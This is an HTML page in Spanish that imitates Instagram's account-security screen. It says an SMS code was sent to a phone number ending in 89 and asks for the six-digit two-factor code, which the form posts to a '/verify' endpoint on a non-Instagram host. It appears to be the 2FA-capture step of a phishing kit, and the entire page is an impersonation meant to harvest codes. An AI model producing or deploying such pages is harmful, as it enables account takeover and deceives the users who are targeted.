<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Seguridad de la cuenta • Instagram</title>
<link rel="icon" type="image/png" href="/PruebasHTML/img/instalogo.jpg">
<style>
* { box-sizing: border-box; }
body {
    background-color: #121212;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    margin: 0;
    padding: 0;
    color: white;
    height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
}
.card {
    background-color: #000;
    border: 1px solid #363636;
    border-radius: 3px;
    width: 350px;
    padding: 20px;
    text-align: center;
}
.icon-lock {
    background: url('https://static.cdninstagram.com/rsrc.php/v3/y5/r/8-a.png') no-repeat;
    background-position: -230px -302px;
    height: 96px;
    width: 96px;
    margin: 0 auto 15px auto;
    display: inline-block;
    background-image: url('https://i.imgur.com/K7lG6E0.png'); 
    background-size: cover; 
    border-radius: 50%;
}
h2 {
    font-size: 16px;
    font-weight: 600;
    margin-bottom: 15px;
}
p {
    font-size: 14px;
    color: #a8a8a8;
    line-height: 18px;
    margin-bottom: 20px;
}
input {
    width: 100%;
    background: #121212;
    border: 1px solid #363636;
    border-radius: 3px;
    padding: 9px 0 7px 8px;
    color: #fff;
    font-size: 12px;
    margin-bottom: 15px;
    outline: none;
}
input:focus { border-color: #a8a8a8; }
button {
    width: 100%;
    background-color: #0095f6;
    border: 1px solid transparent;
    border-radius: 4px;
    color: #fff;
    font-weight: 600;
    padding: 5px 9px;
    text-align: center;
    cursor: pointer;
    font-size: 14px;
    height: 30px;
}
button:hover { background-color: #1877f2; }
.resend {
    margin-top: 15px;
    font-size: 12px;
    color: #0095f6;
    font-weight: 600;
    cursor: pointer;
    text-decoration: none;
    display: block;
}
</style>
</head>
<body>
    <div class="card">
        <div class="icon-lock" style="border: 1px solid #333;"></div>
        <h2>Introduce el código de seguridad</h2>
        <p>Hemos enviado un código de seguridad por SMS a tu número terminado en **89. Introdúcelo para continuar.</p>
        <form action="/verify" method="POST">
            <input type="text" name="code2fa" placeholder="Código de seguridad (6 dígitos)" pattern="[0-9]*" inputmode="numeric" required autocomplete="off">
            <button type="submit">Confirmar</button>
        </form>
        <a class="resend" href="#">Solicitar un código nuevo</a>
    </div>
</body>
</html>
